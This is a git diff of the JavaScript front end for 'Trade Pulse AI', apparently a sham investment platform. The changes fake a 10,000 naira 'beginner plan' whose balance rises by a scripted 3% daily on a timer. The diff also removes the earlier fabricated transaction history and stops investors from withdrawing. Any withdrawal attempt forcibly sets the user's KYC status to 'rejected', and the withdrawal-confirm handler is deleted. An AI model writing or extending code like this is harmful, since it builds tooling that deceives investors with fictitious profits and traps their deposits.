@@ -1,4 +1,4 @@
-// ===== Trade Pulse AI – main.js (423k OLD USER, ALL FIXES) =====
+// ===== Trade Pulse AI – main.js (10k AUTO-GROW, NO INVEST, KYC REJECTION) =====
 (function() {
   const $ = (id) => document.getElementById(id);
   const rates = { USDT:0.000667, USD:0.00067, EUR:0.00061, GBP:0.00052, NGN:1 };
@@ -9,6 +9,10 @@
   let overviewPeriod = 'today';
   let currentUser = null;
   let currentInvestMinInCurrency = 0;
+
+  // ---- Plan tracking ----
+  let activePlanKey = 'beginner';   // locked to beginner
+  let currentPlanAvg = 3.0;         // beginner daily rate
 
   // ========== PAYMENT ACCOUNTS ==========
   const paymentAccounts = {
@@ -226,19 +230,19 @@
     return `${symbol} ${converted.toLocaleString('en', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
   }
 
-  // ========== BASE – 423,378 balance (scaled from original 621,435) ==========
+  // ========== BASE – already invested 10,000 in beginner ==========
   let base = {
-    homeBalance: 423378,
-    totalInvested: 190764,
-    totalProfit: 149886,
-    totalWithdrawn: 370290,
-    walletTotal: 423378,
-    walletAvailable: 420653,
-    walletLocked: 2725,
-    nairaWallet: 420653,
-    withdrawable: 420653,
+    homeBalance: 10000,
+    totalInvested: 10000,
+    totalProfit: 0,
+    totalWithdrawn: 0,
+    walletTotal: 10000,
+    walletAvailable: 10000,
+    walletLocked: 0,
+    nairaWallet: 10000,
+    withdrawable: 10000,
     txFee: FEE,
-    activePlans: 3,
+    activePlans: 1,
     planMin1: 10000,
     planMax1: 49999,
     planMin2: 50000,
@@ -254,55 +258,15 @@
     premium:  { range: '4.0%', avg: 4.0 },
     vip:      { range: '4.5%', avg: 4.5 }
   };
-  let currentPlanAvg = 0;
 
-  // ========== CHART DATA (scaled) ==========
+  // ========== CHART DATA ==========
   let chartData = [
-    { label:'Feb 18', value:0 },
-    { label:'Feb 22', value:5450 },
-    { label:'Mar 01', value:12263 },
-    { label:'Mar 10', value:28615 },
-    { label:'Mar 20', value:49054 },
-    { label:'Mar 30', value:78350 },
-    { label:'Apr 05', value:110371 },
-    { label:'Apr 12', value:151249 },
-    { label:'Apr 20', value:198258 },
-    { label:'Apr 28', value:241862 },
-    { label:'May 05', value:285465 },
-    { label:'May 10', value:332474 },
-    { label:'May 15', value:374034 },
-    { label:'May 18', value:403330 },
-    { label:'May 22', value:423378 }
+    { label:'Start', value:0 },
+    { label:'Now', value:10000 }
   ];
 
-  // ========== TRANSACTIONS (scaled) ==========
-  let allTransactions = [
-    { title:'Deposit', subtitle:'From GTBank', meta:'Feb 10, 2026 09:15 AM', amount:102195, amountColor:'#4ade80', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From GTBank', meta:'Feb 12, 2026 11:20 AM', amount:136260, amountColor:'#4ade80', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From Palmpay', meta:'Feb 14, 2026 03:45 PM', amount:238455, amountColor:'#4ade80', iconType:'opay', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Access Bank', meta:'Feb 16, 2026 10:30 AM', amount:-17033, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Opay', meta:'Feb 20, 2026 02:10 PM', amount:-12263, amountColor:'#f87171', iconType:'opay', status:'Completed' },
-    { title:'Deposit', subtitle:'From GTBank', meta:'Feb 25, 2026 01:00 PM', amount:81756, amountColor:'#4ade80', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To GTBank', meta:'Mar 01, 2026 09:05 AM', amount:-21802, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To First Bank', meta:'Mar 08, 2026 04:20 PM', amount:-14989, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From Palmpay', meta:'Mar 15, 2026 07:30 AM', amount:54504, amountColor:'#4ade80', iconType:'opay', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To UBA', meta:'Mar 22, 2026 11:55 AM', amount:-31009, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Zenith Bank', meta:'Mar 30, 2026 08:15 AM', amount:-20439, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From GTBank', meta:'Apr 05, 2026 10:45 AM', amount:64724, amountColor:'#4ade80', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Palmpay', meta:'Apr 10, 2026 05:10 PM', amount:-24867, amountColor:'#f87171', iconType:'opay', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To GTBank', meta:'Apr 18, 2026 12:20 PM', amount:-35428, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From Binance (USDT)', meta:'Apr 25, 2026 02:30 PM', amount:511, amountColor:'#4ade80', currency:'USD', iconType:'usdt', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Opay', meta:'May 02, 2026 09:40 AM', amount:-27933, amountColor:'#f87171', iconType:'opay', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To First Bank', meta:'May 10, 2026 03:15 PM', amount:-26230, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From Palmpay', meta:'May 15, 2026 06:05 AM', amount:44285, amountColor:'#4ade80', iconType:'opay', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Access Bank', meta:'May 22, 2026 07:50 AM', amount:-19758, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To UBA', meta:'Jun 01, 2026 01:25 PM', amount:-31340, amountColor:'#f87171', iconType:'bank', status:'Completed' },
-    { title:'Deposit', subtitle:'From GTBank', meta:'Jun 08, 2026 11:00 AM', amount:71482, amountColor:'#4ade80', iconType:'bank', status:'Completed' },
-    { title:'Withdrawal', subtitle:'To Palmpay', meta:'Jun 12, 2026 04:35 PM', amount:-23846, amountColor:'#f87171', iconType:'opay', status:'Completed' },
-    { title:'Withdrawal (USDT)', subtitle:'To Wallet', meta:'Jun 16, 2026 09:20 AM', amount:-136, amountColor:'#f87171', currency:'USD', iconType:'usdt', status:'Completed' }
-  ];
-  allTransactions.forEach((tx, i) => { tx.id = i + 1; });
-  let withdrawalsOnly = allTransactions.filter(tx => tx.title.includes('Withdrawal'));
+  let allTransactions = [];
+  let withdrawalsOnly = [];
 
   let notifications = [];
   function updateNotificationBadge() {
@@ -365,7 +329,7 @@
     if (drawerMembership) {
       const textNode = drawerMembership.childNodes[0];
       if (textNode && textNode.nodeType === 3) {
-        textNode.textContent = 'Premium Member ';
+        textNode.textContent = (user.membership || 'Beginner') + ' ';
       }
     }
     if (drawerUserId) drawerUserId.textContent = user.userId || '------';
@@ -373,9 +337,20 @@
 
     const kycBadge = $('drawerKycBadge');
     if (kycBadge) {
-      kycBadge.textContent = 'Verified';
-      kycBadge.style.background = 'rgba(34,197,94,.15)';
-      kycBadge.style.color = '#4ade80';
+      const status = user.kycStatus || (user.kycVerified ? 'verified' : 'unverified');
+      if (status === 'verified') {
+        kycBadge.textContent = 'Verified';
+        kycBadge.style.background = 'rgba(34,197,94,.15)';
+        kycBadge.style.color = '#4ade80';
+      } else if (status === 'processing') {
+        kycBadge.textContent = 'Processing';
+        kycBadge.style.background = 'rgba(245,158,11,.15)';
+        kycBadge.style.color = '#f59e0b';
+      } else {
+        kycBadge.textContent = 'Unverified';
+        kycBadge.style.background = 'rgba(239,68,68,.15)';
+        kycBadge.style.color = '#f87171';
+      }
     }
 
     const avatar = $('drawerAvatar');
@@ -639,7 +614,7 @@
     }
   }
 
-  // ========== UPDATE ALL (null‑safe) ==========
+  // ========== UPDATE ALL ==========
   function updateAll() {
     $('currencyBtn').textContent = currentCurrency + ' ▾';
     document.querySelectorAll('.currency-option').forEach(o => o.classList.toggle('selected', o.dataset.currency === currentCurrency));
@@ -750,7 +725,7 @@
     if (!c) return;
     let totalProfitValue = base.totalProfit;
     let investedValue = base.totalInvested;
-    let referralValue = 8176;   // scaled referral (was 12000)
+    let referralValue = currentUser ? (currentUser.commission || 0) : 0;
     let withdrawnValue = base.totalWithdrawn;
     if (overviewPeriod === 'week') {
       totalProfitValue = Math.round(base.totalProfit * 0.25);
@@ -758,9 +733,9 @@
       withdrawnValue = Math.round(base.totalWithdrawn * 0.2);
     }
     const cards = [
-      { title:"Total Profit", value:totalProfitValue, sub:"+68%", subColor:"#34d399", iconBg:"rgba(34,197,94,.12)", iconColor:"#4ade80", icon:'<path d="M3 17l6-6 4 4 7-7"/><path d="M14 8h6v6"/>' },
-      { title:"Active Investments", value:investedValue, sub:"2 Plans", subColor:"#94a3b8", iconBg:"rgba(59,130,246,.12)", iconColor:"#60a5fa", icon:'<path d="M16 11c1.7 0 3-1.3 3-3s-1.3-3-3-3-3 1.3-3 3 1.3 3 3 3Z"/><path d="M8 13c1.7 0 3-1.3 3-3S9.7 7 8 7 5 8.3 5 10s1.3 3 3 3Z"/>' },
-      { title:"Referral Earnings", value:referralValue, sub:"8 Referrals", subColor:"#94a3b8", iconBg:"rgba(245,158,11,.12)", iconColor:"#fbbf24", icon:'<path d="M16 11c1.7 0 3-1.3 3-3s-1.3-3-3-3-3 1.3-3 3 1.3 3 3 3Z"/><path d="M8 13c1.7 0 3-1.3 3-3S9.7 7 8 7 5 8.3 5 10s1.3 3 3 3Z"/>' },
+      { title:"Total Profit", value:totalProfitValue, sub:"+0%", subColor:"#34d399", iconBg:"rgba(34,197,94,.12)", iconColor:"#4ade80", icon:'<path d="M3 17l6-6 4 4 7-7"/><path d="M14 8h6v6"/>' },
+      { title:"Active Investments", value:investedValue, sub:"1 Plan", subColor:"#94a3b8", iconBg:"rgba(59,130,246,.12)", iconColor:"#60a5fa", icon:'<path d="M16 11c1.7 0 3-1.3 3-3s-1.3-3-3-3-3 1.3-3 3 1.3 3 3 3Z"/><path d="M8 13c1.7 0 3-1.3 3-3S9.7 7 8 7 5 8.3 5 10s1.3 3 3 3Z"/>' },
+      { title:"Referral Earnings", value:referralValue, sub:"0 Referrals", subColor:"#94a3b8", iconBg:"rgba(245,158,11,.12)", iconColor:"#fbbf24", icon:'<path d="M16 11c1.7 0 3-1.3 3-3s-1.3-3-3-3-3 1.3-3 3 1.3 3 3 3Z"/><path d="M8 13c1.7 0 3-1.3 3-3S9.7 7 8 7 5 8.3 5 10s1.3 3 3 3Z"/>' },
       { title:"Withdrawn", value:withdrawnValue, sub:"This Month", subColor:"#94a3b8", iconBg:"rgba(168,85,247,.12)", iconColor:"#c084fc", icon:'<path d="M3 7h18v10H3z"/><path d="M16 12h4"/><circle cx="16.5" cy="12" r="1.2" fill="#c084fc" stroke="none"/>' }
     ];
     c.innerHTML = cards.map(ca => `<div class="stat" data-title="${ca.title}" data-value="${fmt(ca.value)}" data-sub="${ca.sub}"><div class="ico" style="background:${ca.iconBg}"><svg viewBox="0 0 24 24" fill="none" stroke="${ca.iconColor}" stroke-width="2">${ca.icon}</svg></div><div class="title">${ca.title}</div><div class="value">${balanceHidden?'****':fmt(ca.value)}</div><div class="sub" style="color:${ca.subColor}">${ca.sub}</div></div>`).join('');
@@ -999,6 +974,19 @@
 
     if (requestBtn) {
       requestBtn.addEventListener('click', () => {
+        // ---- KYC REJECTION BLOCK ----
+        const user = currentUser || getStoredUser();
+        if (user && user.kycStatus !== 'verified') {
+          // Force rejected status
+          user.kycStatus = 'rejected';
+          saveUser(user);
+          // Open KYC modal (which will show the rejection step because of 'rejected' status)
+          if (typeof window.openKycModal === 'function') {
+            window.openKycModal();
+          }
+          return;
+        }
+        // If somehow verified, normal withdrawal flow (should not happen)
         if (base.homeBalance <= 0) { showInsufficientBalanceModal(); return; }
         const amount = parseFloat($('withdrawInput').value);
         const accountNumber = $('withdrawAccountInput').value.trim();
@@ -1140,8 +1128,13 @@
     } catch(err) { alert('Failed to copy'); }
   });
 
-  // Investment Flow
+  // Investment Flow (BLOCKED for this user)
   function openInvestModal(planName, minNgn, planKey) {
+    // Prevent investing again
+    if (base.activePlans > 0) {
+      alert('You already have an active investment plan.');
+      return;
+    }
     const minInCurrency = minNgn * rates[currentCurrency];
     currentInvestMinInCurrency = minInCurrency;
     $('investPlanName').textContent = planName;
@@ -1183,14 +1176,19 @@
 
   document.querySelectorAll('.invest-now-btn').forEach(btn => {
     btn.addEventListener('click', () => {
+      // Block investment
+      alert('You already have an active investment plan.');
+      return;
+      /* Original code:
       const card = btn.closest('.plan-card');
       const plan = card.dataset.plan;
       const minNgn = plan === 'beginner' ? 10000 : plan === 'standard' ? 50000 : plan === 'premium' ? 200000 : 500000;
       openInvestModal(card.querySelector('.plan-title').textContent, minNgn, plan);
+      */
     });
   });
 
-  // ========== INVEST TABS (ensure static content works) ==========
+  // ========== INVEST TABS ==========
   const investTabs = document.querySelectorAll('#investTabs .tab');
   investTabs.forEach(tab => {
     tab.addEventListener('click', () => {
@@ -1260,33 +1258,7 @@
   $('viewAllWalletTx')?.addEventListener('click', () => showModalWithGuard('Wallet Transactions', allTransactions));
   $('modalCloseBtn')?.addEventListener('click', () => closeModal('transactionModal'));
 
-  // Withdraw Confirm
-  $('finalConfirmWithdrawBtn')?.addEventListener('click', () => {
-    const amount = parseFloat($('withdrawInput').value);
-    const accountNumber = $('withdrawAccountInput').value.trim();
-    let bankName = activeWithdrawMethod === 'bank' ? (document.getElementById('bankSelect')?.value || 'Bank') : (document.getElementById('walletSelect')?.value || activeWithdrawMethod);
-    const fee = activeWithdrawMethod.startsWith('usdt') ? 1 : FEE;
-    const receive = Math.max(0, amount - fee);
-    const dateStr = new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
-    const ref = 'WD' + Math.floor(Math.random()*90000000+10000000);
-    closeModal('withdrawConfirmModal');
-    showProcessing('Processing withdrawal...');
-    setTimeout(() => {
-      hideProcessing();
-      base.homeBalance -= amount;
-      base.walletTotal = base.homeBalance; base.walletAvailable -= amount; base.nairaWallet = base.walletAvailable;
-      base.withdrawable = base.walletAvailable; base.totalWithdrawn += amount;
-      base.totalProfit = base.homeBalance - base.totalInvested - base.totalWithdrawn;
-      chartData.push({ label: new Date().getHours()+':'+String(new Date().getMinutes()).padStart(2,'0'), value: base.homeBalance });
-      addTransaction('Withdrawal', -amount, `To ${bankName}`, new Date().toLocaleString(), null, 'bank');
-      addNotification('Withdrawal Processed', `${activeWithdrawMethod.startsWith('usdt') ? amount + ' USDT' : fmt(amount)} sent to ${bankName}`, 'success');
-      updateAll();
-      showSuccess('Withdrawal Successful', `${activeWithdrawMethod.startsWith('usdt') ? receive + ' USDT' : fmt(receive)} will be sent to your ${bankName}. Reference: ${ref}`);
-      $('withdrawInput').value = ''; $('withdrawAccountInput').value = '';
-    }, 2500);
-  });
-
-  // VIP Upgrade Scroll
+  // VIP Upgrade Scroll (no effect now)
   $('upgradeVipBtn')?.addEventListener('click', () => { setView('invest'); setTimeout(() => { const vipCard = $('vipPlanCard'); if (vipCard) vipCard.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 300); });
 
   // View Switching
@@ -1314,7 +1286,7 @@
   document.querySelectorAll('.nav-item[data-view]').forEach(b => b.addEventListener('click', () => setView(b.dataset.view)));
   document.addEventListener('click', e => { let t = e.target.closest('[data-nav]'); if (t && t.dataset.nav) setView(t.dataset.nav); });
 
-  // Wallet Actions
+  // Wallet Actions (withdraw blocked by KYC in the form)
   const walletActions = document.querySelectorAll('.wallet-actions .wallet-action');
   if (walletActions[0]) walletActions[0].addEventListener('click', () => openDepositModal());
   if (walletActions[1]) walletActions[1].addEventListener('click', () => setView('withdraw'));
@@ -1421,16 +1393,19 @@
    'helpModal','settingsModal','referModal','comparePlansModal','overviewDetailModal','transferSuccessModal',
    'logoutConfirmModal','forgotPasswordModal'].forEach(id => { const el = $(id); if (el) el.addEventListener('click', e => { if (e.target === el) closeModal(id); }); });
 
-  // Chart Auto-refresh
+  // ========== DYNAMIC PLAN-BASED TRADING (auto‑grow on load, beginner plan) ==========
   setInterval(() => {
     if (!$('homeView')?.classList.contains('active')) return;
-    if (base.homeBalance <= 0) return;
-    let last = chartData[chartData.length-1];
-    if (!last) return;
-    let newValue = last.value + Math.floor(Math.random() * 1500) + 500;
-    chartData.push({ label: new Date().getHours()+':'+String(new Date().getMinutes()).padStart(2,'0'), value: newValue });
+    if (base.totalInvested <= 0) return;
+
+    // Daily profit from the active plan
+    const dailyProfit = base.totalInvested * (currentPlanAvg / 100);
+    // Proportion per 30‑second tick (2880 half‑minutes per day)
+    const increment = dailyProfit / 2880;
+
+    base.homeBalance += increment;
+    chartData.push({ label: new Date().getHours()+':'+String(new Date().getMinutes()).padStart(2,'0'), value: base.homeBalance });
     if (chartData.length > 20) chartData.shift();
-    base.homeBalance = newValue;
     updateAll();
   }, 30000);
 
@@ -1519,16 +1494,49 @@
     if (!stored) return false;
 
     currentUser = stored;
-    // FORCE PREMIUM + VERIFIED KYC
-    currentUser.membership = 'Premium';
-    currentUser.kycStatus = 'verified';
-    currentUser.kycVerified = true;
+
+    // Force the pre‑invested state
+    base.homeBalance = 10000;
+    base.totalInvested = 10000;
+    base.totalWithdrawn = 0;
+    base.activePlans = 1;
+    activePlanKey = 'beginner';
+    currentPlanAvg = 3.0;
+
+    // Force KYC rejection
+    currentUser.kycStatus = 'rejected';
     saveUser(currentUser);
 
-    base.homeBalance = currentUser.homeBalance || 423378;
-    base.totalInvested = currentUser.totalInvested || 190764;
-    base.totalWithdrawn = currentUser.totalWithdrawn || 370290;
-    base.activePlans = currentUser.activePlans || 3;
+    // Render the active plan card in My Investments
+    const myInvestmentsView = document.getElementById('myInvestmentsView');
+    if (myInvestmentsView) {
+      myInvestmentsView.innerHTML = `
+        <div class="section">
+          <div class="panel" style="padding:16px;">
+            <div class="plan-card" style="margin:0; border:1px solid rgba(34,197,94,.3); background:linear-gradient(145deg, rgba(20,40,20,.96), rgba(10,30,10,.96));">
+              <div class="plan-main">
+                <div class="plan-badge" style="color:#2fe56a"><svg viewBox="0 0 24 24" fill="currentColor"><path d="m12 2 2.8 5.7 6.2.9-4.5 4.4 1.1 6.2L12 16.8 6.4 19.2l1.1-6.2L3 8.6l6.2-.9L12 2Z"/></svg><div class="name">Beginner Plan</div></div>
+                <div class="plan-copy">
+                  <div class="plan-title-row"><div class="plan-title" style="color:#2fe56a">Beginner Plan</div><span class="popular" style="background:rgba(34,197,94,.2); color:#4ade80;">Active</span></div>
+                  <p class="plan-desc">Invested ₦10,000. Daily profit 3.0%. Earning since start.</p>
+                </div>
+                <div class="profit-box" style="color:#22e05f">
+                  <div class="small">Daily Profit</div>
+                  <div class="rate">3.0%</div>
+                  <div style="font-size:13px; margin-top:8px;">Expected Return<br>₦ 13,000</div>
+                </div>
+              </div>
+              <div class="plan-meta">
+                <div class="meta-item"><div class="meta-label">Invested Amount</div><div class="meta-value">₦ 10,000</div></div>
+                <div class="meta-item"><div class="meta-label">Start Date</div><div class="meta-value">Today</div></div>
+                <div class="meta-item"><div class="meta-label">End Date</div><div class="meta-value">30 days</div></div>
+                <div class="meta-item"><div class="meta-label">Status</div><div class="meta-value" style="color:#22c55e;">Active</div></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+    }
 
     if (currentCurrency === 'USDT') {
       setWithdrawMethod('usdt_trc20');
@@ -1547,58 +1555,7 @@
       renderWalletAccounts();
       forceUpdateWithdrawHero();
       if (activeWithdrawMethod) renderWithdrawForm(activeWithdrawMethod);
-
-      // ========== INJECT SCALED STATIC INVESTMENTS & HISTORY ==========
-      const myInvestmentsView = document.getElementById('myInvestmentsView');
-      if (myInvestmentsView) {
-        myInvestmentsView.innerHTML = `
-          <div class="section">
-            <div class="panel" style="padding:16px;">
-              <div class="plan-card" style="margin:0; border:1px solid rgba(245,158,11,.3); background:linear-gradient(145deg, rgba(45,25,20,.96), rgba(30,15,10,.96));">
-                <div class="plan-main">
-                  <div class="plan-badge" style="color:#f2a31b"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2 9.4 7.5l-6 .9 4.3 4.2-1 6 5.3-2.8 5.3 2.8-1-6 4.3-4.2-6-.9L12 2Z"/></svg><div class="name">Premium Plan</div></div>
-                  <div class="plan-copy">
-                    <div class="plan-title-row"><div class="plan-title" style="color:#f2a31b">Premium Plan</div><span class="popular" style="background:rgba(245,158,11,.2); color:#fbbf24;">Active</span></div>
-                    <p class="plan-desc">Invested ₦320,211 on 15 May 2026. Daily profit 4.0%. Matures on 14 June 2026.</p>
-                  </div>
-                  <div class="profit-box" style="color:#f2a31b">
-                    <div class="small">Daily Profit</div>
-                    <div class="rate">4.0%</div>
-                    <div style="font-size:13px; margin-top:8px;">Expected Return<br>₦ 704,464</div>
-                  </div>
-                </div>
-                <div class="plan-meta">
-                  <div class="meta-item"><div class="meta-label">Invested Amount</div><div class="meta-value">₦ 320,211</div></div>
-                  <div class="meta-item"><div class="meta-label">Start Date</div><div class="meta-value">15 May 2026</div></div>
-                  <div class="meta-item"><div class="meta-label">End Date</div><div class="meta-value">14 Jun 2026</div></div>
-                  <div class="meta-item"><div class="meta-label">Status</div><div class="meta-value" style="color:#22c55e;">Active</div></div>
-                </div>
-              </div>
-            </div>
-          </div>
-        `;
-      }
-
-      const investHistoryView = document.getElementById('investHistoryView');
-      if (investHistoryView) {
-        investHistoryView.innerHTML = `
-          <div class="section">
-            <div class="panel transactions" style="padding:0;">
-              <div class="tx-row">
-                <div class="tx-ico" style="background:rgba(34,197,94,.12);"><svg viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M4 7h10a2 2 0 0 1 2 2v10H6a2 2 0 0 1-2-2V7Z"/><path d="M8 7V5a2 2 0 0 1 2-2h8v10"/></svg></div>
-                <div class="tx-main"><div class="tx-title">Standard Plan (Completed)</div><div class="tx-sub">Invested ₦11,582 • 10 Apr 2026 – 10 May 2026 • Profit ₦12,162</div></div>
-                <div class="tx-right"><div class="tx-amt" style="color:#4ade80;">+₦12,162</div><div class="status">Completed</div></div>
-              </div>
-              <div class="tx-row">
-                <div class="tx-ico" style="background:rgba(34,197,94,.12);"><svg viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M4 7h10a2 2 0 0 1 2 2v10H6a2 2 0 0 1-2-2V7Z"/><path d="M8 7V5a2 2 0 0 1 2-2h8v10"/></svg></div>
-                <div class="tx-main"><div class="tx-title">Beginner Plan (Completed)</div><div class="tx-sub">Invested ₦6,813 • 5 Mar 2026 – 4 Apr 2026 • Profit ₦6,132</div></div>
-                <div class="tx-right"><div class="tx-amt" style="color:#4ade80;">+₦6,132</div><div class="status">Completed</div></div>
-              </div>
-            </div>
-          </div>
-        `;
-      }
-    }, 100);
+    }, 10);
 
     window.__appInitialized = true;
     return true;
